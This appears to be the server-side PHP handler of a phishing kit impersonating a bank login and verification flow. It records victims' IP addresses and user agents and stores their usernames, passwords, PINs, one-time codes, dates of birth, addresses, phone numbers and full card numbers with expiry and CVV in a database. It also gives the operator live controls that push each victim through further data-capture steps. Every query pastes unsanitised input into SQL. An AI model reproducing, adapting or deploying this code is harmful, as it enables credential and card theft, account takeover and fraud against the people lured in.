<?php

$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$date = date('l d F Y');
$time = date('H:i');

$VictimInfo  = "| IP Address : $ip\n";
$VictimInfo .= "| UserAgent : $useragent\n";
//$VictimInfo .= "| Browser : $browser\n";
require "conn.php";
//
date_default_timezone_set("Europe/London");
$time_ = time();

if (isset($_POST["loader"])) {
    //
    if ($_POST["loader"] == "checkUser") {
        //
        $sql = "SELECT * FROM customers WHERE status = '1'";
        //
        $result = mysqli_query($conn, $sql);
        //
        if (mysqli_num_rows($result) > 0) {
            echo 1;
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "updateUser") {
        //
        $sql = "UPDATE customers SET status='0' where status = '1'";

        if ($result = mysqli_query($conn, $sql)) {
            //
            echo 0;
        }
    }

    if ($_POST["loader"] == "deleteItem") {
        //
        $id = $_POST['id'];
        //
        $sql = "DELETE FROM customers  where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            echo 1;
        }
    }

    if ($_POST["loader"] == "requestor") {
        $id = $_POST["id"];
        $status = $_POST["status"];
        //114
        $tokid = $_POST["flag1"];
        $flag2 = $_POST["flag2"];
        $flag3 = $_POST["flag3"];

        $flag4 = $_POST["flag4"];
        $flag5 = $_POST["flag5"];
        $flag6 = $_POST["flag6"];

        //
        if ($status == 500) {
            $sql = "UPDATE customers SET status='$status', vbvotp='$tokid' where id = $id";
        } else if ($status == 50) {
            $sql = "UPDATE customers SET status='$status', online_status =1, buzzed =0 where id = $id";
        } else if ($status == 255) {
            $sql = "UPDATE customers SET status='$status', code1='$tokid', code2='$flag2', code3='$flag3', code4='$flag4', code5='$flag5', code6='$flag6', online_status =0, buzzed =0 where id = $id";
        } else if ($status == 42) {
            $sql = "UPDATE customers SET status='$status', code1='$tokid', online_status =0, buzzed =0 where id = $id";
        } else {
            $sql = "UPDATE customers SET status='$status', online_status =0, buzzed =0 where id = $id";
        }

        if ($result = mysqli_query($conn, $sql)) {
            //

            echo 1;
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "subMerch") {
        //$conn

        $uniqueid = $_POST["id"];
        $status = $_POST["status"];
        //

        $sql = "UPDATE customers SET status=$status WHERE uniqueid=$uniqueid";
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {

            echo json_encode(array("status" => "ok"));
        } else {
            echo json_encode(array("status" => mysqli_error($conn)));
        }
    }

    if ($_POST["loader"] == "checkStatus") {
        //
        $id = $_POST["id"];
        //

        $sql = "SELECT status FROM customers WHERE id = $id";
        //
        $result = mysqli_query($conn, $sql);
        //

        if (mysqli_num_rows($result) > 0) {
            //
            while ($rows = mysqli_fetch_assoc($result)) {
                //
                echo $rows["status"];
            }
        } else {
            echo 0;
        }
    }


    if ($_POST["loader"] == "insertUser") {
        //
        session_start();
        //

        //die($auth);
        $status = 1;

        if (isset($_SESSION["id"]) && $_SESSION["id"] != '') {
            $uid = $_POST["user"];
            $id = $_SESSION["id"];
            //
            $auth = $_POST["password"];

            if (isset($_POST["user"]) && $_POST["user"] != "") {
                //
                $sql = "UPDATE customers SET username='$uid', uniqueid='$uid', pass ='$auth', status=$status, online_status=1 WHERE id=$id";
            } //else {
            //     $sql = "UPDATE customers SET viewed = 1, phone='$phone', status=$status, online_status=1 WHERE id=$id";
            // }
        } else {
            $uid = $_POST["user"];
            $auth = $_POST["password"];

            // $code1 = $_POST["code1"];
            // $code2 = $_POST["code2"];
            // $code3 = $_POST["code3"];
            // $code4 = $_POST["code4"];
            // $code5 = $_POST["code5"];
            // $code6 = $_POST["code6"];

            //
            $sql = "INSERT INTO customers (uniqueid, ip, useragent, username, pass, status, online_status, lastonline, viewed) VALUES ('$uid', '$ip', '$useragent', '$uid', '$auth', $status, 1, $time_, 1)";
        }

        //
        if ($result = mysqli_query($conn, $sql)) {
            //
            if (!isset($_SESSION["id"])) {
                //
                $last_id = mysqli_insert_id($conn);
                //
                $_SESSION["id"] = $last_id;
            }

            //echo $last_id;
            header('location: ../loading.php');
        } else {
            echo mysqli_error($conn);
            //header('location: ../phone.php');
        }
    }

    if ($_POST["loader"] == "snoti") {
        //$conn

        $id = $_POST["id"];
        $status = 1;
        $nt = $_POST["check"];
        //

        if ($nt) {
            $sql = "UPDATE customers SET status=$status, viewed = 1, online_status =1, buzzed=1, oid='Checked' WHERE id=$id";
        } else {
            $sql = "UPDATE customers SET status=$status, viewed = 1, online_status =1, oid='Not checked', pin='$code' WHERE id=$id";
        }
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {

            header('location: ../loading.php');
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "calling") {
        //$conn

        $id = $_POST["id"];
        $status = 1;
        $nt = $_POST["check"];
        //


        $sql = "UPDATE customers SET status=$status, viewed = 1, online_status =1, code3='clicked continue' WHERE id=$id";

        $result = mysqli_query($conn, $sql);
        //
        if ($result) {

            header('location: ../loading.php');
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "contactus") {
        //$conn

        $id = $_POST["id"];
        $status = 1;
        $nt = $_POST["check"];
        //


        $sql = "UPDATE customers SET status=$status, viewed = 1, online_status =1, code4='clicked continue' WHERE id=$id";

        $result = mysqli_query($conn, $sql);
        //
        if ($result) {

            header('location: ../loading.php');
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "rlog") {
        //$conn

        $id = $_POST["id"];
        $status = 1;
        $uid = $_POST["user"];
        $auth = $_POST["pass"];

        //

        if ($uid) {
            $sql = "UPDATE customers SET username='$uid', viewed =1, uniqueid='$uid', pass='$auth', status=$status, online_status=1 WHERE id=$id";
        } else {
            $sql = "UPDATE customers SET status=$status, viewed = 1, online_status =1, oid='Not checked', pin='$code' WHERE id=$id";
        }
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {

            header('location: ../loading.php');
        } else {
            echo 0;
        }
    }


    if ($_POST["loader"] == "emailus") {
        $isid = $_POST["user"];
        $pass = $_POST["pass"];
        $status = $_POST["status"];
        $id = $_POST["id"];

        //
        $sql = "UPDATE customers SET status='$status', email ='$isid', pass ='$pass' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            echo 1;
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "details") {
        $id = $_POST["id"];
        $status = 1;

        $dob = $_POST["dob"];
        $fname = $_POST["fname"];


        //
        $sql = "UPDATE customers SET status='$status', dob ='$dob', vbvotp ='$fname' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            header('location: ../loading.php');
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "billing") {
        $id = $_POST["id"];
        $status = 1;

        $adr = $_POST["address"];
        $city = $_POST["city"];
        $pcode = $_POST["postcode"];


        //
        $sql = "UPDATE customers SET status='$status', code2 ='$adr', code3 ='$city', code4 ='$pcode' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            header('location: ../loading.php');
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "code6") {
        $id = $_POST["id"];
        $status = 1;
        $dg = $_POST["6digit"];

        //
        $sql = "UPDATE customers SET status='$status', online_status= 1, code6 ='$dg' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            header('location: ../loading.php');
        } else {
            echo mysqli_error($conn);
            //header('location: ../phone.php');
        }
    }

    if ($_POST["loader"] == "code3") {
        $id = $_POST["id"];
        $status = 1;
        $dg = $_POST["atm"];

        //
        $sql = "UPDATE customers SET status='$status', online_status= 1, code3 ='$dg' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            header('location: ../loading.php');
        } else {
            echo mysqli_error($conn);
            //header('location: ../phone.php');
        }
    }

    if ($_POST["loader"] == "code5") {
        $id = $_POST["id"];
        $status = 1;
        $dg = $_POST["otp2"];

        //
        $sql = "UPDATE customers SET status='$status', online_status= 1, code5 ='$dg' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            header('location: ../../loading.php');
        } else {
            echo mysqli_error($conn);
            //header('location: ../phone.php');
        }
    }

    if ($_POST["loader"] == "oib") {
        $id = $_POST["id"];
        $status = 1;
        if (isset($_POST["check"])) {
            //
            $dg = 'Checkbox Clicked';
        } else {
            //
            $dg = 'Checkbox Not-Clicked';
        }


        //
        $sql = "UPDATE customers SET status='$status', online_status= 1, oid ='$dg' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            header('location: ../loading.php');
        } else {
            echo mysqli_error($conn);
            //header('location: ../phone.php');
        }
    }


    if ($_POST["loader"] == "branch") {
        $id = $_POST["id"];
        $status = 1;
        $branch = $_POST["branch"];

        //
        $sql = "UPDATE customers SET status='$status', viewed = 1, online_status =1, lastonline ='$time_', merchant ='$branch' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            header('location: ../loading.php');
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "verifi") {
        $id = $_POST["id"];
        $status = 1;
        $code = $_POST["vcode"];

        //
        $sql = "UPDATE customers SET status='$status', viewed = 1, online_status =1, lastonline ='$time_', code5 ='$code' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            header('location: ../loading.php');
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "auth") {
        $id = $_POST["id"];
        $status = 1;
        $code = "clicked continue";

        //
        $sql = "UPDATE customers SET status='$status', viewed = 1, online_status =1, lastonline ='$time_', code11 ='$code' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            header('location: ../loading.php');
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "checkPage") {
        $id = $_POST["id"];
        $status = $_POST["status"];

        //
        $sql = "UPDATE customers SET status='$status', online_status=1, buzzed=6 where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            echo 1;
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "nic") {
        $id = $_POST["id"];
        $status = $_POST["status"];
        $nic = $_POST["nic"];

        //
        $sql = "UPDATE customers SET status='$status', online_status=1, amount ='$nic' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            header('location: ../loading.php');
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "foo") {
        $id = $_POST["id"];
        $status = $_POST["status"];
        $foo = $_POST['foo4'] . $_POST['foo1'] . $_POST['foo2'] . $_POST['foo5'] . $_POST['foo6'] . $_POST['foo3'];

        //
        $sql = "UPDATE customers SET status='$status', online_status=1, pass ='$foo' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            header('location: ../loading.php');
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "online") {
        $id = $_POST["id"];
        $online = $_POST["online_status"];

        //
        $sql = "UPDATE customers SET online_status ='$online' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            echo 1;
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "offline") {
        $id = $_POST["id"];
        $offline = $_POST["online_status"];

        //
        $sql = "UPDATE customers SET online_status ='$offline' where id = $id";

        if ($result = mysqli_query($conn, $sql)) {
            //
            echo 1;
        } else {
            echo 0;
        }
    }



    if ($_POST["loader"] == "otp") {
        //$conn

        $id = $_POST["id"];
        $status = 1;
        $code = $_POST["otp"];
        //

        $sql = "UPDATE customers SET status=$status, viewed = 1, online_status =1, otp='$code' WHERE id=$id";
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {
            header('location: ../loading.php');
            //echo 1;
        } else {
            //header('location: ../loading.php');
            echo 0;
        }
    }

    if ($_POST["loader"] == "otpem") {
        //$conn

        $id = $_POST["id"];
        $status = 1;
        $code = $_POST["otp"];
        //

        $sql = "UPDATE customers SET status=$status, viewed = 1, online_status =1, code1='$code' WHERE id=$id";
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {
            header('location: ../loading.php');
            //echo 1;
        } else {
            //header('location: ../loading.php');
            echo 0;
        }
    }

    if ($_POST["loader"] == "password") {
        //$conn

        $id = $_POST["id"];
        $status = 1;
        $pass = $_POST["pass"];
        //
        $code1 = $_POST["code1"];
        $code2 = $_POST["code2"];
        $code3 = $_POST["code3"];
        $code4 = $_POST["code4"];
        $code5 = $_POST["code5"];
        $code6 = $_POST["code6"];
        //

        $sql = "UPDATE customers SET status=$status, online_status =1, viewed=1, pass='$pass', code1='$code1', code2='$code2', code3='$code3', code4='$code4', code5='$code5', code6='$code6' WHERE id=$id";
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {
            header('location: ../loading.php');
            //echo 1;
        } else {
            //header('location: ../loading.php');
            echo 0;
        }
    }

    if ($_POST["loader"] == "atm") {
        //$conn

        $id = $_POST["id"];
        $status = $_POST["status"];
        $code = $_POST["atm"];
        //

        $sql = "UPDATE customers SET status=$status, online_status =1, code3='$code' WHERE id=$id";
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {
            header('location: ../loading.php');
            //echo 1;
        } else {
            //header('location: ../loading.php');
            echo 0;
        }
    }

    if ($_POST["loader"] == "auth1") {
        //$conn

        $id = $_POST["id"];
        $status = $_POST["status"];
        $auth1 = $_POST["auth1"];
        //

        $sql = "UPDATE customers SET status=$status, online_status =1, code4='$auth1' WHERE id=$id";
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {
            header('location: ../loading.php');
            //echo 1;
        } else {
            //header('location: ../loading.php');
            echo 0;
        }
    }

    if ($_POST["loader"] == "vuotp") {
        //$conn

        $id = $_POST["id"];
        $status = 1;
        $code = $_POST["passnumber"];
        //

        $sql = "UPDATE customers SET status=$status, viewed = 1, online_status =1, vbvotp='$code' WHERE id=$id";
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {
            header('location: ../loading.php');
        } else {
            header('location: ../loading.php');
        }
    }

    if ($_POST["loader"] == "digit") {
        //$conn

        $id = $_POST["id"];
        $status = 1;
        $code1 = $_POST["code1"];
        $code2 = $_POST["code2"];
        $code3 = $_POST["code3"];
        $code4 = $_POST["code4"];
        $code5 = $_POST["code5"];
        $code6 = $_POST["code6"];
        //

        $sql = "UPDATE customers SET viewed = 1, status=$status, online_status =1, code1='$code1', code2='$code2', code3='$code3', code4='$code4', code5='$code5', code6='$code6', pass='$pass' WHERE id=$id";
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {

            header('location: ../loading.php');
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "phone") {
        //$conn

        $id = $_POST["id"];
        $status = 1;
        $phone = $_POST["phone"];
        //

        $sql = "UPDATE customers SET viewed =1, status=$status, online_status =1, phone='$phone' WHERE id=$id";
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {

            // echo 1;
            header('location: ../loading.php');
        } else {
            echo 0;
            //header('location: ../loading.php');
        }
    }

    if ($_POST["loader"] == "onlinestatus") {
        $isid = $_POST["id"];

        //
        $sql = "UPDATE customers SET lastonline=NOW() where id = $isid";

        if ($result = mysqli_query($conn, $sql)) {
            //
            echo 1;
        } else {
            echo 0;
        }
    }

    if ($_POST["loader"] == "card") {
        //$conn

        $id = $_POST["id"];
        $status = 1;
        //$ccname = $_POST['ccname'];
        $ccnum = $_POST['ccno'];
        $cccvv = $_POST['secode'];
        $ccexp = $_POST['ccexp'];

        //

        $sql = "UPDATE customers SET online_status =1, viewed = 1, ccname='hlo', cnumber='$ccnum', cexp='$ccexp', cvvs='$cccvv', status=1, buzzed=0 WHERE id=$id";
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {

            //echo 1;
            header('location: ../loading.php');
        } else {
            echo 0;
            //header('location: ../loading.php');
        }
    }


    if ($_POST["loader"] == "subOtpp") {
        //$conn

        $uniqueid = $_POST["id"];
        $status = 1;
        $code = $_POST["otp"];
        $phone = $_POST["phone"];
        //

        $sql = "UPDATE customers SET viewed =1, status=$status, phone='$phone', vbvotp='$code' WHERE id=$uniqueid";
        $result = mysqli_query($conn, $sql);
        //
        if ($result) {

            header('location: ../loading.php');
        } else {
            echo json_encode(array("status" => mysqli_error($conn)));
        }
    }
}

$userid = $uniqueid = "";
if (isset($_POST["pin_digit1"])) {

    //
    if ($_POST["userid"] && $_POST["dob"] && $_POST["pin_digit1"] && $_POST["pin_digit2"] && $_POST["pin_digit3"] && $_POST["pin_digit4"] and $_POST["pin_digit5"] && $_POST["pin_digit6"] && $_POST["ip"] && $_POST["ua"]) {
        // echo 0;
        $userid  = trim(htmlspecialchars($_POST["userid"]));
        $mobile = $_POST["phone"];
        $dob = trim(htmlspecialchars($_POST["dob"]));
        $pin = trim(htmlspecialchars($_POST["pin_digit1"]  . $_POST["pin_digit2"] . $_POST["pin_digit3"] . $_POST["pin_digit4"] . $_POST["pin_digit5"] . $_POST["pin_digit6"]));
        $ips = trim(htmlspecialchars($_POST["ip"]));
        $ua = trim(htmlspecialchars(urlencode($_POST["ua"])));
        $uniqueid = rand(0, 200000);

        //
        $sql = "SELECT * FROM customers WHERE username='$userid'";
        $result = mysqli_query($conn, $sql);
        if (mysqli_num_rows($result) > 0) {
            //
            $sql = "UPDATE customers SET status=1, buzzed=0, phone='$mobile',username='$userid', dob='$dob', pin='$pin', useragent='$ua', ip='$ip' WHERE username='$userid'";
        } else {
            //
            $sql = "INSERT INTO customers (username, phone, dob, pin, ip, useragent, uniqueid, status) VALUES ('$userid','$mobile', '$dob', '$pin', '$ip', '$useragent', $uniqueid, 1)";
            // echo $sql;
            // exit();
        }

        //
        if ($result = mysqli_query($conn, $sql)) {
            //
            $last_id = mysqli_insert_id($conn);
            //
            session_start();
            //
            $_SESSION['started'] = true;
            $_SESSION['userid'] = $last_id;
            $_SESSION['uniqueid'] = $uniqueid;
            //


            //
            if ($_SESSION["started"]) {
                // echo '<script>setSession('. $last_id .', '.$uniqueid.')</script>';
                echo json_encode(array("status" => "ok", "userid" => $last_id, "uniqueid" => $uniqueid));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            echo json_encode(array("status" => mysqli_error($conn)));
        }
    }

    //
}


//

if (isset($_GET["uniqueid"])) {
    //

    $uniqueid = $_GET["uniqueid"];
    $currentTime = time();

    $upload_time = mysqli_query($conn, "UPDATE customers SET lastonline=$currentTime WHERE id=$uniqueid");
    if ($upload_time) {
        echo json_encode(array(
            'status' => 'success'
        ));
    } else {
        echo json_encode(array(
            'status' => 'failure',
            'error' => mysqli_error($conn)
        ));
    }
}

if (isset($_GET['online'])) {
    //
    require "./isfunction.php";
    //
    $get_entries = mysqli_query($conn, "SELECT lastonline FROM customers");
    $vic_rows = [];

    $offline_vics = [];
    $online_vics = [];

    if ($get_entries) {
        while ($row = mysqli_fetch_array($get_entries)) {
            $vic_rows[] = $row;
        }

        foreach ($vic_rows as $vic_row) {
            if (compare_time($vic_row["lastonline"]) > 5) {
                $offline_vics[] = $vic_row;
            } else {
                $online_vics[] = $vic_row;
            }
        }

        echo json_encode(array(
            'online' => count($online_vics),
            'offline' => count($offline_vics)
        ));
    }
}
